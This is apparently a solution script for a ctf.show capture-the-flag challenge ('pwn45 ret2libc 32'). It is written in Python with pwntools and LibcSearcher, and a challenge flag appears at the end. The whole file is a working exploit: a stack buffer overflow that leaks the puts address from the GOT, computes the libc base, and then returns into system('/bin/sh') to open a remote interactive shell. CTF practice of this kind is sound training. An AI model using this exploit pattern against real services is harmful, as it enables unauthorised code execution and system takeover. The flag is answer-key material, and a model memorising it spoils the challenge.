#pwn45 ret2libc 32
from pwn import *
from LibcSearcher import *
elf = ELF('./pwn')
p = remote('pwn.challenge.ctf.show', 28240)

offset = 0x6B + 0x4
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main = elf.symbols["main"]

payload = b'a' * offset + p32(puts_plt) + p32(main) + p32(puts_got)
p.recvuntil("O.o?")
p.sendline(payload)
puts_real = u32(p.recvuntil('\xf7')[-4:])
#puts_real = u32(p.recv(4))
log.info("puts_real: " + hex(puts_real))

#libc = ELF('/home/ctfshow/libc/32bit/libc-2.27.so')
libc = LibcSearcher("puts", puts_real)
#libc.address = write_real - libc.symbols['puts']

#libc = LibcSearcher("write", write_real)
libc_base= puts_real-libc.dump("puts")
sys_addr = libc_base + libc.dump("system")
binsh_addr = libc_base + libc.dump("str_bin_sh")

p.recvuntil("O.o?")
payload2 = b'a' * offset + p32(sys_addr) + p32(0) + p32(binsh_addr)
p.sendline(payload2)
p.interactive()
#ctfshow{a22ed4e6-7061-4be7-849e-a2e91ca8a33b}